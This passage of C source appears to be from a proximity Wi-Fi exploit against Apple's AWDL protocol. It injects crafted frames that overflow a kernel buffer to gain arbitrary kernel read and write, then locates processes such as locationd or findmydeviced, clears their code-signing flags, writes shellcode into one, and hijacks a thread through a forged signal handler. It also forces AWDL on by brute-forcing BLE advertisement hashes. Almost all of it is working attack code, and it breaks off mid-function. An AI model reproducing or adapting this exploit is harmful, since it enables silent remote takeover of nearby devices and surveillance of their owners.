      SERV_PARAM(),
      HT_CAPS(),
      DATAPATH(lower_peer_mac),
      PKT_END());

  inject(RT(),
      WIFI(dst, upper_peer_mac),
      AWDL(),
      SYNC_PARAMS(),
      SERV_PARAM(),
      HT_CAPS(),
      DATAPATH(upper_peer_mac),
      PKT_END());
  
  // we'll place the fake service_request descriptor in the NanSync buffer in the lower peer:
  struct nsync_payload {
    uint8_t pad_0[5];
    uint64_t ptr;
    uint8_t pad_1[0xc];
    uint32_t len;
  } __attribute__((packed));

  struct nsync_payload np = {0};
  np.ptr = lower_peer_kaddr;
  np.len = 0x100;

  inject(RT(),
      WIFI(dst, lower_peer_mac),
      AWDL(),
      SYNC_PARAMS(),
      SERV_PARAM(),
      HT_CAPS(),
      DATAPATH(lower_peer_mac),
      NSYNC(&np, sizeof(np)),
      PKT_END());

  refresh_peers();

  init_arbitrary_add(dst,
                     lower_peer_mac,
                     upper_peer_mac,
                     lower_peer_kaddr,
                     upper_peer_kaddr,
                     leak,
                     0);
  
  // write a fake pointer val:
  // we've placed the pointer at +8 in the nsync_tlv buffer in lower peer
  uint64_t srd_kaddr = lower_peer_kaddr + 0x4c4 // nsync tlv buffer
                                        + 8     // offset of where we put the ptr field
                                        - 0x40; // offset of the ptr field in the IO80211ServiceRequestDescriptor

  bootstrap_arbitrary_read_fast(peer_manager, srd_kaddr);
  //TODO: should verify that 

  refresh_peers();

  printf("setting up arbitrary read fast\n");
  init_arbitrary_read_fast(lower_peer_kaddr + 0x4c4+8, dst, lower_peer_mac);

/*
  refresh_peers();
  int write_success_cnt = 0;
  uint8_t test_byte = 'A';
  for (int i = 0; i < 1000; i++) {
    uint64_t test_buffer = 0;
    memset(&test_buffer, test_byte, 8);
    test_byte+=0x33;
    uint64_t target_kaddr = upper_peer_kaddr + 0x1780;
    int write_success = wkbuf_bundled(target_kaddr, (uint8_t*)&test_buffer, 8);
    if (write_success) {
      write_success_cnt++;
    }
  }

  printf("wrote %d u64s, %d without errors\n", 1000, write_success_cnt);
  return;
*/
/*
  test_buffer_write();
  printf("AGAINNNNNNN~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
  test_buffer_write();
  printf("AGAINNNNNNN~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
  test_buffer_write();
  printf("AGAINNNNNNN~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
  test_buffer_write();
  printf("AGAINNNNNNN~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
  test_buffer_write();
  printf("AGAINNNNNNN~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
  test_buffer_write();
  printf("AGAINNNNNNN~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
  test_buffer_write();
  return;
*/
/*
  init_faster_peer_refresh(dst,
                           lower_peer_mac,
                           upper_peer_mac,
                           lower_peer_kaddr,
                           upper_peer_kaddr,
                           leak);
*/








/*
  let's test our ability to place large buffers in the kalloc heap
  and find them:
*/
  if (!just_pop_calc) {
    init_kmem_leak(dst, peer_manager);
  }
/*
  char a_buffer[16];
  memset(a_buffer, 'A', 16);
  uint64_t kmem_ptr = copy_buffer_to_kmem(a_buffer, 15, 16, 0);
  printf("kmem_ptr: 0x%016llx\n", kmem_ptr);
*/
  




/*
  Let's pop calc! This was prototyped using oob_timestamp so I'm just copying the steps in to here:
  Traverse the process list looking for our victim; we'll go for locationd
*/

  //uint64_t kernproc = 0xFFFFFFF00941B818 + kaslr_slide; // this is proc0, in __DATA:__common

  //uint64_t proc = kernproc;

  // head of the allproc list:

  uint64_t proc = rk64(0xFFFFFFF00941C940+kaslr_slide);
  // 
  uint8_t* proc_buf = NULL;
  for (int i = 0; i < 1024; i++) {
    // large reads are just as fast as slow reads, so always try to read as much as we'll need in one go
    // (if it'll fit...)
    if (proc == 0 || proc == -1) {
      printf("didn't find target process\n");
      return;
    } 
  
    proc_buf = arbitrary_read_fast(proc, 0x268);
    refresh_peers();
    uint32_t pid = *((uint32_t*)(proc_buf+0x68));
    char p_comm[17];
    memcpy(p_comm, proc_buf+0x258, 16);
    p_comm[16] = 0;
    printf("proc: 0x%016llx pid: %d p_comm: %s\n", proc, pid, p_comm);

    // so what we really want to be doing here is looking for processes with pmap_cs_enforcement set to 0
    // in their pmap; for now lets hack around that:
    if (just_pop_calc) {

      char* candidates[] = {"accessoryd", "appstored", /*"duetexpertd",*/ "findmydeviced", "kbd", "locationd", "imagent", "lsd", NULL};

      int found_match = 0;
      for(int k = 0;;k++) {
        char* candidate = candidates[k];
        if (!candidate) {
          break;
        }
        if (strcmp(p_comm, candidate) == 0) {
          found_match = 1;
          printf("found target with suitable entitlements\n");
          break;
        }
      }
      if (found_match) {
        break;
      }
      /*
      if (strcmp(p_comm, "kdb") == 0) {
        printf("found target!\n");
        break;
      }
      */
    } else {
      if (strcmp(p_comm, "YouTube") == 0) {
        printf("found target!\n");
        break;
      }
    }
    //proc = *((uint64_t*)(proc_buf+0x8));
    proc = *((uint64_t*)(proc_buf+0x0));

    free(proc_buf);
    proc_buf = NULL;
  }


  uint64_t task = rk64(proc+0x10); // proc->task
  printf("task: 0x%016llx\n", task);

  //refresh_peers();

  // work out the dyld_shared_cache slide:
  uint64_t shared_region = rk64(task+0x3b8);
  printf("shared_region: 0x%016llx\n", shared_region);
  //refresh_peers();

  uint64_t dyld_shared_cache_slide = rk64(shared_region+0x48);
  printf("dyld_shared_cache slide: 0x%016llx\n", dyld_shared_cache_slide);
  //refresh_peers();





#if 0

  // **** let's test how fast we can write to the commpage:
  uint64_t commpage = rk64(0xFFFFFFF0078CB338 + kaslr_slide);
  uint8_t* orig = malloc(0x200);
  memset(orig, 0, 0x200);
  uint8_t* desired = malloc(0x200);
  memset(desired, 0x90, 0x200);

  uint64_t timestamp_before_write = now_nanoseconds();
  wkbuf_bundled(commpage+0x800, desired, 0x200);
  uint64_t write_elapsed_nano = now_nanoseconds() - timestamp_before_write;

  printf("0x200 byte buffer write took %lld milli\n", write_elapsed_nano/(1000*1000));
#endif


  if (!just_pop_calc) {

    // change the codesigning flags:
    uint32_t p_csflags = rk32(proc+0x298);
    printf("p_csflags: 0x%08x\n", p_csflags);

    // clear the codesigning ones:
    #define    CS_HARD            0x0000100
    #define    CS_KILL            0x0000200
    #define CS_ENFORCEMENT        0x0001000
    #define CS_GET_TASK_ALLOW    0x0000004
    #define CS_DEBUGGED         0x10000000

    // clear some flags...
    p_csflags &= ~(CS_HARD|CS_KILL|CS_ENFORCEMENT);

    // set some flags:
    p_csflags |= (CS_GET_TASK_ALLOW|CS_DEBUGGED);

    wk32(proc+0x298, p_csflags);






    uint64_t initial_x0 = 0;
    // make the first thread believe it needs to handle a SIGHUP:
    uint64_t thread_list_head = task+0x58;

    uint64_t thread = rk64(thread_list_head);
    printf("thread: 0x%016llx\n", thread);

    uint64_t uthread = rk64(thread+0x3c0);  // thread->uthread (bsd thread structure)
    printf("uthread: 0x%016llx\n", uthread);


    // we're now targeting the Kernel alloc once page which is highly likely to be right after
    // the binary image, and hot
    
    // load address of the main binary
    uint64_t load_addr = rk64(task+0x5f8);
    printf("load_addr:0x%016llx\n", load_addr);

    //uint64_t konce_base_user = load_addr + 0x1634000;
    uint64_t target_user_va = load_addr;

    // that's a userspace page, so to write it we need to go via the physmap...
    init_physmem(kaslr_slide);

    uint64_t vmmap = rk64(task+0x28);
    printf("vmmap:0x%016llx\n", vmmap);
    uint64_t pmap = rk64(vmmap+0x48);
    printf("pmap:0x%016llx\n", pmap);
    uint64_t ttbr0 = rk64(pmap+8);
    printf("ttbr0:0x%016llx\n", ttbr0);

    // we'll stick some shellcode over the mach header; should probably do a read so we can fix it up later!

    uint64_t l1_tte, l2_tte, l3_tte;
    uint64_t target_pa = aarch64_page_table_lookup(ttbr0, target_user_va, &l1_tte, &l2_tte, &l3_tte);
    printf("target_pa:0x%016llx\n", target_pa);

    // get a kernel virtual address for that physical page in the physmap:
    uint64_t target_kv = phystokv(target_pa);
    printf("target_kv:0x%016llx\n", target_kv);
    
    uint64_t initial_pc = 0;


    initial_pc = load_payload(task, target_kv, target_user_va, kaslr_slide, dyld_shared_cache_slide, "stage2.bin");



    initial_x0 = 0x1234;


    printf("adding fake signal handler\n");

    // add our signal handler
    // this first slot will always be 0s, so could speed things up here
    uint64_t sigacts = *((uint64_t*)(proc_buf+0x120));

    // this is a constant CFSTR("com.apple.calculator")
    //wk64(sigacts+(31*8),      0x1BF452778ULL+dyld_shared_cache_slide); // X0

    wk64(sigacts+(31*8), initial_x0); // X0

    // this is this gadget in CommunicationsSetupUI:
    //   MOV  W1, #0
    //   BL   _SBSLaunchApplicationWithIdentifier
    //wk64(sigacts+((32+31)*8), 0x1A0DBC8CCULL+dyld_shared_cache_slide); // PC
    wk64(sigacts+((32+31)*8), initial_pc); // PC


    // disable user jop for this thread:
    // wk8(thread+0x488, 0x80);
    wk8(uthread+0x10c+3, 0x40); // uthread->siglist (mask of pending signals)

    wk8_no_retry(thread+0x2e8, 0x80); // thread->act |= AST_BSD

    printf("&&&&&&&&&&&&&&&&&&&&&&&&&&&&& done??\n");
  } else {
    // just_pop_calc
    
    uint64_t thread_list_head = task+0x58;

    uint64_t thread = rk64(thread_list_head);
    printf("thread: 0x%016llx\n", thread);

    uint64_t uthread = rk64(thread+0x3c0);  // thread->uthread (bsd thread structure)
    printf("uthread: 0x%016llx\n", uthread);

    // add our signal handler
    // this first slot will always be 0s, so could speed things up here
    uint64_t sigacts = *((uint64_t*)(proc_buf+0x120));

    // this is a constant CFSTR("com.apple.calculator")
    wk64(sigacts+(31*8),      0x1BF452778ULL+dyld_shared_cache_slide); // X0

    // this is this gadget in CommunicationsSetupUI:
    //   MOV  W1, #0
    //   BL   _SBSLaunchApplicationWithIdentifier
    wk64(sigacts+((32+31)*8), 0x1A0DBC8CCULL+dyld_shared_cache_slide); // PC


    // disable user jop for this thread:
    wk8(thread+0x488, 0x80);

    wk8(uthread+0x10c+3, 0x40); // uthread->siglist (mask of pending signals)

    wk8_no_retry(thread+0x2e8, 0x80); // thread->act |= AST_BSD

    printf("&&&&&&&&&&&&&&&&&&&&&&&&&&&&& done??\n");

  }

  // disable srd to prevent panic:
  // for now, let it panic... this needs to be an atomic write
  //wk64(peer_manager+0x2978, 0);

  return;
}



// http://www.yonch.com/tech/82-linux-thread-priority
void set_realtime_priority() {
     int ret;
 
     // We'll operate on the currently running thread.
     pthread_t this_thread = pthread_self();
     // struct sched_param is used to store the scheduling priority
     struct sched_param params;
 
     // We'll set the priority to the maximum.
     params.sched_priority = sched_get_priority_max(SCHED_FIFO);

        // Attempt to set thread real-time priority to the SCHED_FIFO policy
     ret = pthread_setschedparam(this_thread, SCHED_FIFO, &params);
     if (ret != 0) {
         // Print the error
         printf("Unsuccessful in setting thread realtime prio\n");
         return;
     }

          // Now verify the change in thread priority
     int policy = 0;
     ret = pthread_getschedparam(this_thread, &policy, &params);
     if (ret != 0) {
         printf("Couldn't retrieve real-time scheduling paramers\n");
         return;
     }

     // Check the correct policy was applied
     if(policy != SCHED_FIFO) {
         printf("Scheduling is NOT SCHED_FIFO!\n");
     } else {
         printf("SCHED_FIFO OK\n");
     }
}

// FLAG up acks and print timestamp
// maybe we should use a second interface and attach a BPF filter to just give us ACKs?
void* ACK_thread(void* arg) {
  //set_realtime_priority();
  printf("ACK thread\n");
  // first try using the global handle:
  int pcap_err = pcap_loop(second_global_pcap_handle, 0, ack_packet_handler, NULL);

  if (pcap_err == -2) {
    // pcap_breakloop was called, indicating that we broke out of the monitor loop
    log_msg("back in monitor_umi after pcap_breakloop()");
  }
}

void* ENABLE_thread(void* arg) {
  //set_realtime_priority();
  printf("ENABLE thread\n");
  // first try using the global handle:
  int pcap_err = pcap_loop(second_global_pcap_handle, 0, enable_packet_handler, NULL);

  if (pcap_err == -2) {
    // pcap_breakloop was called, indicating that we broke out of the monitor loop
    log_msg("back in ENABLE_thread after pcap_breakloop()");
  }

  printf("ENABLE_thread is exiting\n");
}



void inject_stuff(struct ether_addr dst) {
  struct ether_addr good_peer = *(ether_aton("22:22:00:00:00:00"));
  struct ether_addr bad_peer  = *(ether_aton("22:22:22:00:00:00"));
  struct ether_addr steerer   = *(ether_aton("22:22:00:00:00:00"));

/*
  for (int i = 0; i < 1000; i++){
    *((uint32_t*)(((uint8_t*)&good_peer)+2))  = i;
    printf("injecting: %s (%d) \n", ether_ntoa(&good_peer), i);
    print_now("inj");
    inject_unreliable(RT(),
        WIFI(dst, good_peer),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        HT_CAPS(),
        DATAPATH(good_peer),
        TLV_IGN(i+3),
        PKT_END());
    usleep(20000); // wait 20 ms
  }
  */

#if 0

  for (int i = 0; i < 400; i++){
    *((uint32_t*)(((uint8_t*)&good_peer)+2))  = i;
    printf("injecting: %s (%d) \n", ether_ntoa(&good_peer), i);
    print_now("inj");
    int received = try_inject(RT(),
        WIFI(dst, good_peer),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        HT_CAPS(),
        DATAPATH(good_peer),
        TLV_IGN(700),
        PKT_END());
    if (received) {
      printf("inj YES\n");
    } else {
      printf("inj NO\n");
    }
    //usleep(20000); // wait 20ms
  }

#endif
  struct ether_addr peer_a = *(ether_aton("22:22:44:44:00:00"));
  struct ether_addr peer_b = *(ether_aton("22:22:44:44:00:01"));
  
  for (int i = 0; i < 100; i++){
    *((uint32_t*)(((uint8_t*)&good_peer)+2))  = i;
    printf("injecting: %s (%d) \n", ether_ntoa(&good_peer), i);
    print_now("inj");
    /*
    try_inject(RT(),
        WIFI(peer_a, good_peer),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        HT_CAPS(),
        DATAPATH(good_peer),
        TLV_IGN(20),
        PKT_END());
    */
    inject(RT(),
        WIFI(dst, good_peer),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        HT_CAPS(),
        DATAPATH(good_peer),
        TLV_IGN(20),
        PKT_END());
    //usleep(20000); // wait 20ms
  }

/*

  for (int i = 0; i < 100; i++){
    *((uint32_t*)(((uint8_t*)&good_peer)+2))  = i;
    printf("injecting: %s (%d) \n", ether_ntoa(&good_peer), i);
    print_now("inj");
    inject(RT(),
        WIFI(dst, good_peer),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        HT_CAPS(),
        DATAPATH(good_peer),
        TLV_IGN(20),
        PKT_END());
    //usleep(20000); // wait 20ms
  }


  for (int i = 0; i < 20; i++) {
    uint16_t tlv_len = 0;
    uint8_t* tlv_val = try_get_TLV(0x12);

    if (tlv_val) {
      hexdump(tlv_val, 3);
      free(tlv_val);
    }
  }
  */
}

// assumes NULL-terminated string, doesn't write the NULL
void file_write_string(char* path, char* str) {
    FILE* f = fopen(path, "w");
    if (!f) {
        perror("failed to open debugfs file for writing\n");
        exit(EXIT_FAILURE);
    }

    printf("writing: %s to file %s\n", str, path);
    
    size_t written = fwrite(str, strlen(str), 1, f);
    if (written == 0) {
        printf("failed to write to debugfs file\n");
        exit(EXIT_FAILURE);
    }
    fclose(f);
}

/*
The "proper" way to change the device MAC, using netlink, is too slow.
See change_mac_netlink.c for how that works, it seems to take at least 1.5 seconds.
I think this is probably because it will only work if you bring the interface down
first, change the MAC, then bring it back up.

We can do better!

The mt76 driver exposes the memory-mapped registers via debugfs, specifically via two files:

  regidx: register address
  regval: register value

regidx is a u32 decimal debugfs file, that means, you write a newline-terminated
string of a 32-bit decimal value there.

regval is a 32-bit hex file; you can read or write strings with this format there:

  "0x%08x\n"

The values read from or written to regval come from (or go to) the registers addresses
by regidx.

The device MAC address (which is 6 bytes) is split across two 32-bit registers,
4104 and 4108. The upper two bytes of 4108 do appear to mean something, but they
always seem to be 0, so leave them 0.
 
Changing the MAC address this way is very fast, and does work for our purposes,
but poor iw, ip, ifconfig etc will be very confused, so don't be surprised if they
don't seem to reflect the updated MAC. You can verify that the device does indeed
believe it has a new my by observing the behaviour in active monitor mode, the device
will now ACK frames for the new MAC.
*/
void mt76_debugfs_change_mac(char* phy_str, struct ether_addr new_mac) {
    union mac_dwords {
      struct ether_addr new_mac;
      uint32_t dwords[2];
    } data = {0};

    data.new_mac = new_mac;

    char lower_dword_hex_str[16] = {0};
    snprintf(lower_dword_hex_str, 16, "0x%08x\n", data.dwords[0]);

    char upper_dword_hex_str[16] = {0};
    snprintf(upper_dword_hex_str, 16, "0x%08x\n", data.dwords[1]);

    char* regidx_path = NULL;
    asprintf(&regidx_path, "/sys/kernel/debug/ieee80211/%s/mt76/regidx", phy_str);

    char* regval_path = NULL;
    asprintf(&regval_path, "/sys/kernel/debug/ieee80211/%s/mt76/regval", phy_str);

    file_write_string(regidx_path, "4104\n");
    file_write_string(regval_path, lower_dword_hex_str);

    file_write_string(regidx_path, "4108\n");
    file_write_string(regval_path, upper_dword_hex_str);

    free(regidx_path);
    free(regval_path);   
}

void test_multi_read(struct ether_addr dst, char* phy_str) {
  struct ether_addr peer_a = *(ether_aton("22:22:aa:22:00:00"));
  struct ether_addr peer_b = *(ether_aton("22:22:bb:22:00:00"));

  struct ether_addr reader_peers[8];
  reader_peers[0] = *(ether_aton("22:22:aa:22:00:00"));
  //reader_peers[0] = *(ether_aton("22:22:22:22:22:22"));
  reader_peers[1] = *(ether_aton("22:22:aa:22:00:01"));
  reader_peers[2] = *(ether_aton("22:22:aa:22:00:02"));
  reader_peers[3] = *(ether_aton("22:22:aa:22:00:03"));
  reader_peers[4] = *(ether_aton("22:22:aa:22:00:04"));
  reader_peers[5] = *(ether_aton("22:22:aa:22:00:05"));
  reader_peers[6] = *(ether_aton("22:22:aa:22:00:06"));
  reader_peers[7] = *(ether_aton("22:22:aa:22:00:07"));


  uint64_t kaddr = 0xFFFFFF8000AD30D0 + 0xc400000;

  struct ether_addr master_peer = *(ether_aton("22:22:bb:22:00:00"));

  static int read_attempt = 1;

  int n_peers = 8;

  read_attempt++;

  // make reader peers suitable for bss steering

  for (int i = 0; i < n_peers; i++) {
    inject(RT(),
        WIFI(dst, reader_peers[i]),
        AWDL(),
        SYNC_PARAMS(),
        //SYNC_PARAMS_EMPTY(),
        CHAN_SEQ_EMPTY(),
        HT_CAPS(),
        UNICAST_DATAPATH(0x1307 | 0x800),
        PKT_END());
  }

  // initiate bss steering for peer_a from peer_b
  // this is for cold start; need this later
  
  if (read_attempt == 1) {
    inject(RT(),
           WIFI(dst, peer_b),
           AWDL(),
           SYNC_PARAMS(),
           HT_CAPS(),
           UNICAST_DATAPATH(0x1307),
           BSS_STEERING(reader_peers, n_peers),
           PKT_END());
  } else {
    
    inject(RT(),
           WIFI(dst, peer_b),
           AWDL(),
           SYNC_PARAMS(),
           //SYNC_PARAMS_EMPTY(),
           //CHAN_SEQ_EMPTY(),
           HT_CAPS(),
           UNICAST_DATAPATH(0x1307),
           BSS_STEERING_0(reader_peers, n_peers),
           PKT_END());
  }


 // sleep(2);

  //printf("trying UMI read kaddr: 0x%016llx\n", kaddr);
  // send another broadcast datapath to allocate the chanseq and kickstart UMIs, but also include an overflow at the end :)
  
  for (int i = 0; i < n_peers; i++) {
    char overflower[128] = {0};
    *(uint64_t*)(&overflower[0x50]) = 0xFFFFFF8000AD30D0 + 0xc400000 + (i*4);
    
    mt76_debugfs_change_mac(phy_str, reader_peers[i]);

/*
    inject(RT(),
        WIFI(dst, reader_peers[i]),
        AWDL(),
        SYNC_PARAMS(),
        //SYNC_PARAMS_EMPTY(),
        CHAN_SEQ_EMPTY(),
        SERV_PARAM(),
        HT_CAPS(),
        //DATAPATH(reader_peers[i]), // broadcast datapath, to get the chanseq allocated
        SYNC_TREE((struct ether_addr*)overflower, sizeof(overflower)/sizeof(struct ether_addr)),
        PKT_END());
*/
    //usleep(100*1000);

    inject(RT(),
        WIFI(dst, reader_peers[i]),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        HT_CAPS(),
        //CHAN_SEQ_50(),
        DATAPATH(reader_peers[i]), // broadcast datapath, to get the chanseq allocated
        SYNC_TREE((struct ether_addr*)overflower, sizeof(overflower)/sizeof(struct ether_addr)),
        PKT_END());

    usleep(500*1000);

/*
    if (i%2) {
      inject(RT(),
          WIFI(dst, reader_peers[i]),
          AWDL(),
          SYNC_PARAMS_50(),
          SERV_PARAM(),
          HT_CAPS(),
          //CHAN_SEQ_50(),
          DATAPATH(reader_peers[i]), // broadcast datapath, to get the chanseq allocated
          //SYNC_TREE((struct ether_addr*)overflower, sizeof(overflower)/sizeof(struct ether_addr)),
          PKT_END());
    } else {
      inject(RT(),
          WIFI(dst, reader_peers[i]),
          AWDL(),
          SYNC_PARAMS_50_ALT(),
          SERV_PARAM(),
          HT_CAPS(),
          //CHAN_SEQ_50_ALT(),
          DATAPATH(reader_peers[i]), // broadcast datapath, to get the chanseq allocated
          //SYNC_TREE((struct ether_addr*)overflower, sizeof(overflower)/sizeof(struct ether_addr)),
          PKT_END());
  
      }
 */   
      //usleep(100*1000);
      //sleep(1);
  }

  sleep(2);


/*
  for (int i = 0; i < 2; i++) {
    inject(RT(),
        WIFI(dst, reader_peers[i]),
        AWDL(),
        SYNC_PARAMS(),
        HT_CAPS(),
        UNICAST_DATAPATH(0x1307 | 0x800),
        PKT_END());
  }

  sleep(2);
  */  
/*  
  inject(RT(),
      WIFI(dst, peer_a),
      AWDL(),
      SYNC_PARAMS(),
      SERV_PARAM(),
      HT_CAPS(),
      DATAPATH(peer_a), // broadcast datapath, to get the chanseq allocated
      SYNC_TREE((struct ether_addr*)overflower, sizeof(overflower)/sizeof(struct ether_addr)),
      PKT_END());
  
  usleep(100*1000);
*/

  // we need to wait at least a second for the UMI to be refreshed
  // usleep(1000000);
  /*
  uint64_t start_nanoseconds = now_nanoseconds();

  // try to receive a UMI:
  void* steering_tlv = try_get_TLV(0x1d);

  if (steering_tlv) {
    struct mini_tlv {
      uint8_t type;
      uint16_t len;
    } __attribute__((packed));
    hexdump(steering_tlv, ((struct mini_tlv*)steering_tlv)->len+3);
    *out_size = ((struct mini_tlv*)steering_tlv)->len+3;
  } else {
    printf("didn't get TLV\n");
  }
  */

  // time to bail, trigger the overflow to NULL out the bsssteering blob
  for (int i = 0; i < n_peers; i++) {
    char null_overflower [128] = {0};
    inject(RT(),
        WIFI(dst, reader_peers[i]),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        HT_CAPS(),
        DATAPATH(reader_peers[i]),
        SYNC_TREE((struct ether_addr*)null_overflower, sizeof(null_overflower)/sizeof(struct ether_addr)),
        PKT_END());
  }

  // TODO: don't wait here, also, this doesn't wait long enough
  // wait for steering to fail
  //usleep(4*1000*1000);

  //return steering_tlv;
}


struct early_read_params {
    struct ether_addr dst;
    char* phy_str;
} er_para;

void init_early_read(struct ether_addr dst, char* phy_str) {
  er_para.dst = dst;
  er_para.phy_str = phy_str;

  reader_peers[0] = *(ether_aton("22:22:aa:22:00:00"));
  reader_peers[1] = *(ether_aton("22:22:aa:22:00:01"));
  reader_peers[2] = *(ether_aton("22:22:aa:22:00:02"));
  reader_peers[3] = *(ether_aton("22:22:aa:22:00:03"));
  reader_peers[4] = *(ether_aton("22:22:aa:22:00:04"));
  reader_peers[5] = *(ether_aton("22:22:aa:22:00:05"));
  reader_peers[6] = *(ether_aton("22:22:aa:22:00:06"));
  reader_peers[7] = *(ether_aton("22:22:aa:22:00:07"));
}

uint64_t steering_begin_timestamp = 0;
int n_steered_peers = 0;


void* try_early_read(uint64_t kaddr, size_t* out_size) {
  struct ether_addr peer_b = *(ether_aton("22:22:bb:22:00:00"));
  int n_peers = 8;
  struct ether_addr reader_peer;
  int should_restart_steering = 0;
  // what phase are we in?

  uint64_t milliseconds_since_last_steering = (now_nanoseconds() - steering_begin_timestamp) / (1ULL*1000ULL*1000ULL);
  printf("%llu milliseconds since last steering (%d)\n", milliseconds_since_last_steering, n_steered_peers);
  
  if (milliseconds_since_last_steering < 5000 && n_steered_peers < 8) {
    // if less than 5 seconds have elapsed since we started steering and we haven't reached
    // the peer limit, then steer the next peer
    reader_peer = reader_peers[n_steered_peers++];
    printf("less than 5 seconds and n_steered_peers < 8\n");
  } else if (milliseconds_since_last_steering < 8000) {
    printf("waiting until we can restart steering for early read\n");
    usleep((8000 - milliseconds_since_last_steering) * 1000);
    printf("restarting steering\n");
    should_restart_steering = 1;
  } else {
    // more than 8 seconds have already elapsed since we last started steering (or we've never started it)
    // restart
    should_restart_steering = 1;
  }

  if (should_restart_steering) {
    printf("restarting steering\n");
    // make reader peers suitable for bss steering
    n_steered_peers = 0;

    for (int i = 0; i < n_peers; i++) {
      inject(RT(),
          WIFI(er_para.dst, reader_peers[i]),
          AWDL(),
          SYNC_PARAMS(),
          CHAN_SEQ_EMPTY(),
          HT_CAPS(),
          UNICAST_DATAPATH(0x1307 | 0x800),
          PKT_END());
    }

    inject(RT(),
           WIFI(er_para.dst, peer_b),
           AWDL(),
           SYNC_PARAMS(),
           HT_CAPS(),
           UNICAST_DATAPATH(0x1307),
           BSS_STEERING_0(reader_peers, n_peers),
           PKT_END());

    steering_begin_timestamp = now_nanoseconds();
    reader_peer = reader_peers[n_steered_peers++];
  }

  char overflower[128] = {0};
  *(uint64_t*)(&overflower[0x50]) = kaddr;
 
  // set the card's MAC to ACK the UMI from the target
  mt76_debugfs_change_mac(er_para.phy_str, reader_peer);

  inject(RT(),
      WIFI(er_para.dst, reader_peer),
      AWDL(),
      SYNC_PARAMS(),
      SERV_PARAM(),
      HT_CAPS(),
      DATAPATH(reader_peer),
      SYNC_TREE((struct ether_addr*)overflower, sizeof(overflower)/sizeof(struct ether_addr)),
      PKT_END());

  // try to receive a UMI:
  void* steering_tlv = try_get_TLV(0x1d);

  if (steering_tlv) {
    struct mini_tlv {
      uint8_t type;
      uint16_t len;
    } __attribute__((packed));
    hexdump(steering_tlv, ((struct mini_tlv*)steering_tlv)->len+3);
    *out_size = ((struct mini_tlv*)steering_tlv)->len+3;
  } else {
    printf("didn't get TLV\n");
  }

  // NULL out the bsssteering blob
  char null_overflower [128] = {0};
  inject(RT(),
      WIFI(er_para.dst, reader_peer),
      AWDL(),
      SYNC_PARAMS(),
      SERV_PARAM(),
      HT_CAPS(),
      DATAPATH(reader_peer),
      SYNC_TREE((struct ether_addr*)null_overflower, sizeof(null_overflower)/sizeof(struct ether_addr)),
      PKT_END());

  // the active monitor interface doesn't always manage to ACK the first frame
  usleep(1*1000);

  return steering_tlv;
}

void test_early_read(struct ether_addr dst_mac, char* phy_str) {
  init_early_read(dst_mac, phy_str);

  int n_failures = 0;
  int n_attempts = 200;


  for (int i = 0; i < n_attempts; i++) {
    size_t out_size = 0;
    uint64_t kaslr_slide = 0x2e800000;
    uint64_t kaddr = 0xFFFFFF8000AD30D0 + kaslr_slide + ((i%7)*4);
    void* buf = try_early_read(kaddr, &out_size);
    if (buf) {
      printf("early read %d success\n", i);
      free(buf);
    } else {
      printf("early read %d fail\n");
      n_failures++;
    }
  }

  printf("reads done, %d failures from %d attempts\n", n_failures, n_attempts);

}

void test_power_level_modulation(struct ether_addr dst) {
  struct ether_addr good_peer = *(ether_aton("22:22:00:00:00:00"));

  for (int i = 1; i < 100; i++){
    set_injection_power_level(injection_interface_name, i);
    //*((uint32_t*)(((uint8_t*)&good_peer)+2))  = i;
    printf("injecting: %s (%d) \n", ether_ntoa(&good_peer), i);
    print_now("inj");
    try_inject(RT(),
        WIFI(dst, good_peer),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        HT_CAPS(),
        DATAPATH(good_peer),
        TLV_IGN(i+3),
        PKT_END());
    usleep(20000); // wait 20 ms
  }

}

int broadcast_any_awdl_hash(char* bt_device_name) {
  if (!init_btle(bt_device_name)){
    printf("failed to enable btle...\n");
    return 0;
  }

  uint16_t hash1 = 0;
  uint16_t hash2 = 1;
  uint16_t hash3 = 2;
  uint16_t hash4 = 3;
  int enabled = start_advertising_hashes((uint8_t*)&hash1, (uint8_t*)&hash2, (uint8_t*)&hash3, (uint8_t*)&hash4);
  if (!enabled) {
    printf("failed to start advertising hashes...\n");
    return 0;
  }

  printf("starting awdl ble broadcast\n");

  return 1;
}

int force_enable_awdl(char* bt_device_name, struct ether_addr* awdl_interface_mac) {
  if (!init_btle(bt_device_name)){
    printf("failed to enable btle...\n");
    return 0;
  }

  // start the sniffing thread looking for AWDL peers
  pthread_t peer_th;
  pthread_create(&peer_th, NULL, ENABLE_thread, NULL);
  
  // TODO: replace this with a mutex?
  usleep(500000);

  int success = 0;
  for (int i = 0; i < 0x80; i+=4) {
    uint16_t hash1 = i;
    uint16_t hash2 = i+1;
    uint16_t hash3 = i+2;
    uint16_t hash4 = i+3;
    int enabled = start_advertising_hashes((uint8_t*)&hash1, (uint8_t*)&hash2, (uint8_t*)&hash3, (uint8_t*)&hash4);
    if (!enabled) {
      printf("failed to start advertising hashes...\n");
      return 0;
    }

    pthread_mutex_lock(&force_enable_mutex);

    waiting_for_new_peer = 1;
    found_new_peer = 0;
    uint64_t timeout_absolute_nano = now_nanoseconds() + 2000 * 1000ULL * 1000ULL; // timeout after 1500 ms;
    struct timespec timeout_absolute_timespec = nanoseconds_to_timespec(timeout_absolute_nano);
    int ret = pthread_cond_timedwait(&force_enable_cond, &force_enable_mutex, &timeout_absolute_timespec);
    if (ret != 0 && ret != ETIMEDOUT) {
      perror("unexpected error from pthread_cond_timedwait\n");
    }

    waiting_for_new_peer = 0;
    if (!found_new_peer) {
      // timed out without finding a new peer, try the next hash
      pthread_mutex_unlock(&force_enable_mutex);
      continue;
    }

    // found a peer!
